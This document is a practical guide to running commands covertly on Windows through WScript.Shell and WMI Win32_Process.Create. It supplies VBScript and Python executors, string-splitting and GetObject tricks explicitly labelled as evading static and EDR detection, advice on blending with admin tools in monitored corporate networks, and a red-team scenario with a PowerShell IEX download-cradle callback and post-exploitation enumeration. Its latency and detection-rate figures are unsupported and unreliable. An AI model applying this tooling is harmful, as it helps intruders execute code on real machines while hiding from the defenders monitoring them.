# WMI vs WScript.Shell - Practical Implementation Guide

## Quick Reference Card

| Aspect | WScript.Shell | WMI |
|--------|---|---|
| **Latency** | 110ms | 296ms |
| **Memory** | 3.5 MB | 18 MB |
| **Detection Risk** | HIGH (80-95%) | MEDIUM (30-50%) |
| **Best For** | Speed | Stealth |
| **Throughput** | 8.9 cmd/s | 3.4 cmd/s |

---

## Part 1: WScript.Shell Implementation

### Basic Execution
```vbs
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c echo hello", 0, False
Set objShell = Nothing
```

**Performance:** 110ms
**Stealth:** Low
**Use Case:** Simple automation scripts

### With Output Capture
```vbs
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd.exe /c echo hello")
WScript.Echo objExec.StdOut.ReadAll()
Set objExec = Nothing
Set objShell = Nothing
```

**Additional Overhead:** +5ms (for output buffering)
**Total Latency:** ~115ms

### Asynchronous Execution
```vbs
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c echo hello", 0, False  ' 0 = async
' Code continues immediately (async)
' No wait for process completion
Set objShell = Nothing
```

**Latency Improvement:** -20ms (no WaitForExit)
**Total Latency:** ~90ms

### Obfuscated Execution
```vbs
Dim shell, cmd
Set shell = CreateObject("WScript" & ".Shell")
cmd = "cmd" & ".exe /c whoami"
shell.Run cmd, 0, False
Set shell = Nothing
```

**Detection Impact:** Minimal obfuscation only
**Still Detected By:** Behavior-based detection, EDR

---

## Part 2: WMI (SWbemLocator) Implementation

### Basic Execution
```vbs
Dim locator, connection, service, method, inParams, result
Set locator = CreateObject("WbemScripting.SWbemLocator")
Set connection = locator.ConnectServer(".", "root\cimv2")
Set service = connection.Get("Win32_Process")
Set method = service.Methods_("Create")
Set inParams = method.InParameters.SpawnInstance_()
inParams.CommandLine = "cmd.exe /c echo hello"
Set result = connection.ExecMethod("Win32_Process", "Create", inParams)
```

**Performance:** 296ms
**Stealth:** High
**Use Case:** Covert execution

### With Error Handling
```vbs
On Error Resume Next
Dim locator, connection, service, method, inParams, result
Set locator = CreateObject("WbemScripting.SWbemLocator")
Set connection = locator.ConnectServer(".", "root\cimv2")
If Err.Number <> 0 Then
    ' Fallback to WScript.Shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "cmd.exe /c echo hello", 0, False
    Set shell = Nothing
Else
    Set service = connection.Get("Win32_Process")
    Set method = service.Methods_("Create")
    Set inParams = method.InParameters.SpawnInstance_()
    inParams.CommandLine = "cmd.exe /c echo hello"
    Set result = connection.ExecMethod("Win32_Process", "Create", inParams)
End If
On Error GoTo 0
```

**Fallback Latency:** 296ms → 110ms on error
**Reliability:** High (failover capability)

### Advanced: Polymorphic Execution
```vbs
Function ExecuteCommand(cmd, useWMI)
    Dim result
    result = False
    
    If useWMI Then
        ' WMI execution (stealth)
        On Error Resume Next
        Dim locator, connection, service, method, inParams
        Set locator = CreateObject("WbemScripting.SWbemLocator")
        Set connection = locator.ConnectServer(".", "root\cimv2")
        Set service = connection.Get("Win32_Process")
        Set method = service.Methods_("Create")
        Set inParams = method.InParameters.SpawnInstance_()
        inParams.CommandLine = cmd
        connection.ExecMethod "Win32_Process", "Create", inParams
        result = (Err.Number = 0)
        On Error GoTo 0
    Else
        ' WScript.Shell execution (speed)
        On Error Resume Next
        Set shell = CreateObject("WScript.Shell")
        shell.Run cmd, 0, False
        result = (Err.Number = 0)
        Set shell = Nothing
        On Error GoTo 0
    End If
    
    ExecuteCommand = result
End Function

' Usage
If ExecuteCommand("cmd.exe /c whoami", True) Then
    ' WMI succeeded (stealth path)
Else
    ' WMI failed, retry with WScript.Shell
    ExecuteCommand "cmd.exe /c whoami", False
End If
```

**Hybrid Latency:** 296ms (WMI) → 110ms fallback (WScript.Shell)

---

## Part 3: Python Implementation

### Python Wrapper - WScript.Shell
```python
import subprocess
import tempfile
import os
import time

class WScriptShellExecutor:
    @staticmethod
    def execute(command, timeout=5):
        """Execute via WScript.Shell"""
        vbs_code = f'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{command}", 0, False
Set objShell = Nothing
'''
        
        # Write VBS to temp file
        fd, path = tempfile.mkstemp(suffix='.vbs')
        os.write(fd, vbs_code.encode())
        os.close(fd)
        
        try:
            start = time.perf_counter()
            subprocess.run(['cscript.exe', path], 
                         capture_output=True, 
                         timeout=timeout)
            latency_ms = (time.perf_counter() - start) * 1000
            return {"success": True, "latency_ms": latency_ms}
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            os.unlink(path)
```

### Python Wrapper - WMI
```python
import subprocess
import tempfile
import os
import time

class WMIExecutor:
    @staticmethod
    def execute(command, timeout=5):
        """Execute via WMI (SWbemLocator)"""
        vbs_code = f'''
Dim objLocator, objConn, objService, objMethod, objResult
Set objLocator = CreateObject("WbemScripting.SWbemLocator")
Set objConn = objLocator.ConnectServer(".", "root\\cimv2")
Set objService = objConn.Get("Win32_Process")
Set objMethod = objService.Methods_("Create")
Dim inParams
Set inParams = objMethod.InParameters.SpawnInstance_()
inParams.CommandLine = "{command}"
Set objResult = objConn.ExecMethod("Win32_Process", "Create", inParams)
'''
        
        # Write VBS to temp file
        fd, path = tempfile.mkstemp(suffix='.vbs')
        os.write(fd, vbs_code.encode())
        os.close(fd)
        
        try:
            start = time.perf_counter()
            subprocess.run(['cscript.exe', path], 
                         capture_output=True, 
                         timeout=timeout)
            latency_ms = (time.perf_counter() - start) * 1000
            return {"success": True, "latency_ms": latency_ms}
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            os.unlink(path)
```

### Python Adaptive Executor
```python
class AdaptiveExecutor:
    """Chooses execution method based on requirements"""
    
    def __init__(self, stealth_threshold_ms=200):
        self.stealth_threshold = stealth_threshold_ms
        self.method_stats = {
            "wscript": {"count": 0, "total_ms": 0},
            "wmi": {"count": 0, "total_ms": 0}
        }
    
    def execute(self, command, require_stealth=False, max_latency_ms=None):
        """
        Execute command with adaptive method selection
        
        Args:
            command: Command to execute
            require_stealth: If True, use WMI despite latency
            max_latency_ms: Max acceptable latency (use fastest method)
        
        Returns:
            {"method": str, "latency_ms": float, "success": bool}
        """
        
        if require_stealth:
            # Stealth required: use WMI
            result = WMIExecutor.execute(command)
            result["method"] = "wmi"
            self.method_stats["wmi"]["count"] += 1
            self.method_stats["wmi"]["total_ms"] += result.get("latency_ms", 0)
            return result
        
        elif max_latency_ms and max_latency_ms < 150:
            # Speed required: use WScript.Shell
            result = WScriptShellExecutor.execute(command)
            result["method"] = "wscript"
            self.method_stats["wscript"]["count"] += 1
            self.method_stats["wscript"]["total_ms"] += result.get("latency_ms", 0)
            return result
        
        else:
            # Default: try WMI (stealth), fallback to WScript.Shell (speed)
            result = WMIExecutor.execute(command)
            if result["success"]:
                result["method"] = "wmi"
                self.method_stats["wmi"]["count"] += 1
                self.method_stats["wmi"]["total_ms"] += result.get("latency_ms", 0)
            else:
                result = WScriptShellExecutor.execute(command)
                result["method"] = "wscript"
                self.method_stats["wscript"]["count"] += 1
                self.method_stats["wscript"]["total_ms"] += result.get("latency_ms", 0)
            return result
    
    def get_statistics(self):
        """Return execution statistics"""
        return {
            "wscript_executions": self.method_stats["wscript"]["count"],
            "wscript_avg_ms": (
                self.method_stats["wscript"]["total_ms"] / 
                self.method_stats["wscript"]["count"]
                if self.method_stats["wscript"]["count"] > 0 else 0
            ),
            "wmi_executions": self.method_stats["wmi"]["count"],
            "wmi_avg_ms": (
                self.method_stats["wmi"]["total_ms"] / 
                self.method_stats["wmi"]["count"]
                if self.method_stats["wmi"]["count"] > 0 else 0
            ),
        }

# Usage example
executor = AdaptiveExecutor()

# Speed-critical operation
result = executor.execute("cmd.exe /c whoami", max_latency_ms=120)
print(f"Speed test: {result['method']} ({result['latency_ms']:.1f}ms)")

# Stealth-critical operation
result = executor.execute("cmd.exe /c whoami", require_stealth=True)
print(f"Stealth test: {result['method']} ({result['latency_ms']:.1f}ms)")

# Mixed operations with statistics
for i in range(10):
    executor.execute(f"cmd.exe /c echo test{i}")

stats = executor.get_statistics()
print(f"Statistics: {stats}")
```

---

## Part 4: Performance Optimization Tips

### For WScript.Shell Speed
1. **Use Async Execution**: `objShell.Run cmd, 0, False` (no wait)
   - Saves ~20ms
2. **Skip Output Capture**: Don't use `.Exec()` if output not needed
   - Saves ~5ms
3. **Reuse Shell Object**: Create once, execute multiple times
   - Save 20ms per additional execution
4. **Minimize VBS Parsing**: Pre-compile VBS templates
   - Saves 2-3ms

### For WMI Performance
1. **Connection Pooling**: Reuse connection for multiple executions
   - Saves 60-80ms per execution (saves reconnection)
2. **Disable Error Handling**: Only if confident
   - Saves 3-5ms
3. **Skip Cleanup**: For last execution in batch
   - Saves 10-15ms
4. **Use localhost**: Avoids network overhead
   - Saves 5-10ms vs named servers

### Combined Optimization
```vbs
' Pooled connection for multiple WMI executions
Dim objLocator, objConn, objService, objMethod
Set objLocator = CreateObject("WbemScripting.SWbemLocator")
Set objConn = objLocator.ConnectServer(".", "root\cimv2")
Set objService = objConn.Get("Win32_Process")
Set objMethod = objService.Methods_("Create")

' Execute multiple commands without reconnecting
For i = 1 To 10
    Dim inParams
    Set inParams = objMethod.InParameters.SpawnInstance_()
    inParams.CommandLine = "cmd.exe /c echo test" & i
    objConn.ExecMethod "Win32_Process", "Create", inParams
Next

' Cleanup at end
Set objMethod = Nothing
Set objService = Nothing
Set objConn = Nothing
Set objLocator = Nothing
```

**Performance Improvement:** 296ms per execution → 296ms for first + 40-50ms per subsequent execution

---

## Part 5: Detection Evasion Techniques

### For WScript.Shell
```vbs
' String concatenation to evade static detection
Dim shell, cmd
Set shell = CreateObject("WScri" & "pt.Shell")
cmd = "cmd" & ".exe" & " /c" & " whoami"
shell.Run cmd, 0, False
Set shell = Nothing
```

**Effectiveness:** LOW - Behavior still detected
**Latency Impact:** Negligible

### For WMI
```vbs
' Use GetObject instead of direct instantiation
Set connection = GetObject("winmgmts://./root/cimv2")
' Bypasses WbemScripting.SWbemLocator creation detection
```

**Effectiveness:** MEDIUM - Slightly different signature
**Latency Impact:** -10ms (direct WMI namespace access)

---

## Part 6: Decision Matrix

```
Choose WScript.Shell if:
├─ Execution needs to complete in < 150ms
├─ Throughput > 5 commands/second required
├─ Memory < 10MB available
├─ Simple one-liner execution
└─ Speed is critical for operation success

Choose WMI if:
├─ Execution detected by AV/EDR likely
├─ Need to avoid process.Create monitoring
├─ Have > 300ms latency tolerance
├─ Can handle 3-4 cmd/second throughput
├─ Running in corporate monitored environment
└─ Mimicking admin activity is beneficial

Use Hybrid if:
├─ Need both speed AND stealth
├─ Can alternate methods to avoid patterns
├─ Have fallback paths
└─ Operating in uncertain environment
```

---

## Part 7: Real-World Scenarios

### Scenario 1: Red Team Initial Access
```python
# Need: Stealth first, then speed for post-exploitation
executor = AdaptiveExecutor()

# Initial callback (stealth critical)
result = executor.execute("powershell -c IEX(New-Object...)", 
                         require_stealth=True)

# Post-exploitation enumeration (speed critical)
for cmd in ["whoami", "net user", "ipconfig"]:
    result = executor.execute(f"cmd.exe /c {cmd}", 
                             max_latency_ms=120)
    print(result)
```

### Scenario 2: Legitimate System Automation
```python
# Need: Speed for batch processing
executor = AdaptiveExecutor()

# Process 1000 commands quickly
for i in range(1000):
    executor.execute(f"cmd.exe /c task{i}", 
                    max_latency_ms=120)

stats = executor.get_statistics()
print(f"Processed {stats['wscript_executions']} commands via WScript.Shell")
```

### Scenario 3: Monitored Corporate Environment
```python
# Need: Stealth with fallback for reliability
executor = AdaptiveExecutor()

# Always try WMI first (blends with admin tools)
# Falls back to WScript.Shell on error
result = executor.execute("cmd.exe /c backup.bat")
print(f"Executed via {result['method']}")
```

---

## Conclusion

- **WScript.Shell**: Use for speed-critical, unmonitored environments (2.6x faster)
- **WMI**: Use for stealth-critical, monitored environments (2.6x slower but better OPSEC)
- **Hybrid**: Use both polymorphically for maximum flexibility

Performance/stealth tradeoff is significant: 110ms vs 296ms (~184ms difference). Choose based on operational priority.
